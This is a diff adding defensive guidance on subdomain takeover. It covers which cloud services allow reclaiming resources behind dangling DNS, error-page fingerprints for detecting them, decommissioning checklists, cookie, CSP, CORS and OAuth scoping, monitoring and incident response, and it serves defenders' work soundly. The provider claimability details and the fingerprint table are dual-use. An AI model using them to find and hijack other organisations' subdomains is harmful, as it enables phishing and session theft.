+| Cargo Collective | Portfolio | `*.cargocollective.com` | Portfolio names are reclaimable. |
+| Tumblr | Blog | `*.tumblr.com` | Custom domain associations are released when a blog is deleted. |
+
+#### Conditional Risk: Takeover Possible Under Specific Circumstances
+
+| Provider/Service | Condition | Details |
+|---|---|---|
+| AWS CloudFront | Dangling DNS alone does not establish claimability | Adding a new alternate domain name requires an attached trusted, valid TLS certificate covering that name. [CloudFront checks the certificate subject alternative name](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html). Verify these prerequisites rather than treating a deleted distribution as sufficient evidence of takeover, and remove stale DNS records. |
+| AWS Route 53 (NS Delegation) | NS delegation to deleted hosted zone | If a subdomain's NS records delegate to a Route 53 hosted zone that has been deleted, an attacker can create a new hosted zone for the same subdomain and may receive the same NS server assignments, effectively taking control of all DNS records for that subdomain. |
+| Google Cloud Storage | Bucket deleted | GCS bucket names are globally unique and can be reclaimed after deletion. Google imposes rate limits on bucket creation and may temporarily reserve recently deleted names, but this is not a documented security guarantee and should not be relied upon as a protection. Remove DNS records when decommissioning GCS buckets. |
+| Cloudflare | Misconfigured SaaS setup | Standard Cloudflare usage requires domain ownership verification via nameserver delegation. However, Cloudflare for SaaS (custom hostnames) configurations should use the [custom hostname verification](https://developers.cloudflare.com/cloudflare-for-platforms/cloudflare-for-saas/security/certificate-management/) feature to prevent hostname claim conflicts. |
+
+#### Service Fingerprints for Detection
+
+When scanning for potential subdomain takeovers, look for these distinctive error responses that indicate the backend resource no longer exists:
+
+| Service | Error Response Pattern |
+|---|---|
+| AWS S3 | `NoSuchBucket`, `The specified bucket does not exist` |
+| GitHub Pages | `There isn't a GitHub Pages site here.` |
+| Heroku | `No such app`, `herokucdn.com/error-pages/no-such-app.html` |
+| Azure App Service | `404 Web Site not found` on `*.azurewebsites.net` |
+| Shopify | `Sorry, this shop is currently unavailable.` |
+| Netlify | `Not Found - Request ID:` |
+| Fastly | `Fastly error: unknown domain:` |
+| Zendesk | `Help Center Closed` |
+
+### Prevention Strategies
+
+#### 1. Manage DNS Record Lifecycle During Decommissioning
+
+The correct order of operations when decommissioning a service is:
+
+1. **Redirect or serve a maintenance page** at the subdomain to avoid broken links and user confusion during the transition period
+2. **Update or remove the DNS record** pointing to the resource
+3. **Wait for DNS propagation** (at least the TTL duration, typically 300 to 3600 seconds)
+4. **Then decommission the cloud resource**
+
+The common mistake is doing these steps in reverse: deleting the cloud resource first, which creates an immediate window for takeover that persists until someone notices the dangling record.
+
+In practice, immediately deleting the DNS record can cause disruption if the subdomain is linked from other pages, bookmarked by users, or indexed by search engines. Pointing the record to an internal server that returns an HTTP redirect to the main domain or a simple maintenance page is a reasonable intermediate step that eliminates the takeover risk while preserving a functional user experience during the transition.
+
+#### 2. Maintain a DNS Inventory Linked to Resource Ownership
+
+Keep a documented mapping between DNS records and the cloud resources they point to:
+
+- **What resource** does each CNAME, A, or NS record resolve to?
+- **Which team** owns the resource?
+- **What project or service** is it part of?
+- **When** was it created and when is it expected to be decommissioned?
+- **What is the business justification** for the subdomain?
+
+This can be as simple as a spreadsheet for small organizations or integrated into a Configuration Management Database (CMDB) for larger ones. The critical requirement is that it is consulted and updated during every infrastructure change. Infrastructure-as-Code tools like Terraform, Pulumi, or AWS CDK can also serve as a living inventory when DNS records and cloud resources are managed in the same codebase.
+
+#### 3. Implement Automated Dangling Record Detection
+
+Regularly scan DNS records to identify entries pointing to non-existent resources:
+
+- **Scheduled scans:** Run automated checks daily or weekly against all DNS records to verify that targets still resolve and respond with expected content, not cloud provider error pages.
+- **CI/CD integration:** Add DNS validation to deployment and teardown pipelines. When a service is removed, the pipeline should verify that associated DNS records are also removed before marking the decommissioning as complete.
+- **DNS change monitoring:** Alert when new CNAME records are created and when target resources return errors such as HTTP 404, NXDOMAIN, or cloud provider default error pages.
+
+Open-source tools for detection:
+
+- [dnsReaper](https://github.com/punk-security/dnsReaper): Actively maintained subdomain takeover scanner supporting 40+ service fingerprints with signature-based detection
+- [nuclei](https://github.com/projectdiscovery/nuclei): General-purpose vulnerability scanner with a dedicated set of [subdomain takeover detection templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/dns)
+- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz): Community-maintained reference documenting which services are and are not vulnerable, with proof-of-concept details
+
+#### 4. Use Domain Verification Where Available
+
+Several cloud providers offer domain verification mechanisms that prevent unauthorized users from associating a custom domain with their account. When available, these provide a strong defense layer:
+
+- **Azure App Service:** Supports [custom domain verification via TXT records](https://learn.microsoft.com/en-us/azure/app-service/app-service-web-tutorial-custom-domain). Adding a verification TXT record (e.g., `asuid.subdomain TXT <verification-id>`) ties the custom domain to a specific Azure subscription. Keep this TXT record in place even after decommissioning the App Service to prevent another tenant from claiming the domain.
+- **Google Cloud:** Many GCP services require domain verification through Google Search Console or a DNS TXT record before a custom domain can be associated. Retain verification records as long as the DNS record exists.
+- **Cloudflare:** Standard setup requires domain ownership via nameserver delegation. Cloudflare for SaaS configurations should use the [custom hostname verification](https://developers.cloudflare.com/cloudflare-for-platforms/cloudflare-for-saas/security/certificate-management/) feature.
+- **GitHub Pages:** Verify the domain in the owning account or organization's Pages settings and retain the verification TXT record. This protects the verified domain and immediate subdomains, not arbitrary deeper names covered by wildcard DNS; see [GitHub's verification scope and instructions](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages).
+- **AWS CloudFront:** [New alternate domain names require a trusted certificate covering the name](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html). A name already associated with another distribution cannot be added as the same alternate name. Continue removing stale DNS during decommissioning; protections differ across AWS services.
+
+Where no domain verification is available, the DNS record itself is the only control. Removing it promptly on decommissioning is the only reliable protection.
+
+#### 5. Restrict Wildcard DNS Records
+
+Wildcard DNS records (`*.example.com`) are especially dangerous because they resolve for any subdomain, including those matching services that no longer exist. Any service that previously existed under the wildcard could potentially be taken over, and the organization may not even know which subdomains were in use.
+
+Avoid wildcard records unless absolutely necessary. If required:
+
+- Scope them as narrowly as possible (e.g., `*.staging.example.com` rather than `*.example.com`)
+- Combine with a reverse proxy or load balancer that maintains an allowlist of valid hostnames and returns an error for unrecognized ones
+- Monitor Certificate Transparency logs for unexpected certificate issuance on subdomains matching the wildcard
+
+#### 6. Establish a Decommissioning Checklist
+
+Create a formal checklist that teams must follow when removing any externally facing service:
+
+- [ ] Identify all DNS records (CNAME, A, MX, NS, TXT) associated with the service
+- [ ] Point the DNS record to a maintenance page or redirect (if immediate removal causes user-facing disruption)
+- [ ] Remove or update DNS records
+- [ ] Wait for DNS propagation (at least the TTL duration)
+- [ ] Decommission the cloud resource
+- [ ] Revoke or let expire any SSL/TLS certificates issued for the subdomain
+- [ ] Update the DNS inventory documentation
+- [ ] Remove the subdomain from any OAuth redirect URI allowlists, CSP directives, or CORS configurations
+- [ ] Verify that the subdomain no longer resolves or returns expected content
+- [ ] Run a takeover detection scan against the subdomain to confirm it is not claimable
+
+#### 7. Limit the Blast Radius with Proper Security Scoping
+
+Even if a subdomain takeover occurs, limit the damage by properly scoping security controls:
+
+- **Cookies:** Do not scope session cookies to the parent domain (`.example.com`) unless necessary. Prefer setting cookies on the specific fully qualified subdomain (`app.example.com`). Use the `__Host-` cookie prefix where possible, which restricts the cookie to the exact origin.
+- **Content Security Policy:** Avoid using `*.example.com` in CSP directives. Explicitly list trusted subdomains. A taken-over subdomain matching a CSP wildcard allows the attacker to inject scripts or exfiltrate data without violating the policy.
+- **CORS:** Do not use wildcard subdomain patterns in `Access-Control-Allow-Origin` validation. Validate against an explicit allowlist of trusted origins.
+- **OAuth/SSO:** Do not whitelist entire subdomain patterns in redirect URI validations. Use exact-match redirect URIs. A taken-over subdomain in an OAuth redirect allowlist enables token theft.
+- **Email (SPF/DKIM/DMARC):** If SPF records include mechanisms that match the taken-over subdomain's IP, the attacker can send SPF-authenticated email appearing to originate from your domain.
+
+### Monitoring and Detection
+
+#### Continuous DNS Monitoring
+
+Implement ongoing monitoring to catch dangling records before attackers do:
+
+- **Compare DNS records against live resources.** For every CNAME in your zone, verify the target still exists and responds with expected content rather than a cloud provider error page.
+- **Monitor for service fingerprints.** The error responses listed in the Service Fingerprints table above are strong indicators that a resource has been removed while the DNS record remains. Automated scanning for these patterns should run at least weekly.
+- **Track DNS zone changes.** Use version-controlled DNS management (e.g., Terraform, OctoDNS, or DNSControl) so all record additions and removals are reviewed, approved, and logged. This also creates an audit trail for investigating how a dangling record was introduced.
+- **Monitor Certificate Transparency logs.** Use services like [crt.sh](https://crt.sh) or [certspotter](https://sslmate.com/certspotter/) to alert on any certificate issuance for your subdomains. An unexpected certificate issued for a subdomain you don't control is a strong indicator that takeover has already occurred or is in progress.
+
+#### Indicators of Compromise
+
+Signs that a subdomain may have already been taken over:
+
+- Subdomain suddenly serves unexpected content, a parking page, or a different application than expected
+- SSL/TLS certificate for the subdomain was issued to an unknown entity or organization (visible in Certificate Transparency logs)
+- Users report phishing emails or pages appearing to come from the subdomain
+- Web application firewall or proxy logs show the subdomain resolving to an IP address outside your known infrastructure ranges
+- DMARC aggregate reports show email being sent from the subdomain that your organization did not originate
+
+### Incident Response
+
+If a subdomain takeover is discovered:
+
+1. **Remove the DNS record immediately.** This is the fastest mitigation. It breaks the link between your domain and the attacker's resource. If the record cannot be removed quickly, update it to point to an IP or CNAME you control.
+2. **Revoke or request revocation of any certificates** issued for the subdomain during the takeover period. Check Certificate Transparency logs to identify all certificates that were issued.
+3. **Assess the impact.** Determine whether cookies scoped to the parent domain could have been stolen, whether phishing content was served and for how long, whether any OAuth or SSO flows referenced the subdomain, and whether the attacker could have received email for the subdomain (MX-based takeover).
+4. **Notify affected users** if there is evidence that sensitive data was exposed, credentials were phished, or session cookies were intercepted.
+5. **Investigate the root cause.** Identify the process gap that allowed the dangling record to persist and update decommissioning procedures to prevent recurrence.
+6. **Scan all DNS zones** owned by the organization for other dangling records. The same process gap likely affects other subdomains.
+7. **Document the incident** with a timeline, impact assessment, and corrective actions for internal review and to improve organizational response to future occurrences.
 
 ## Unvalidated Redirects and Forwards
 
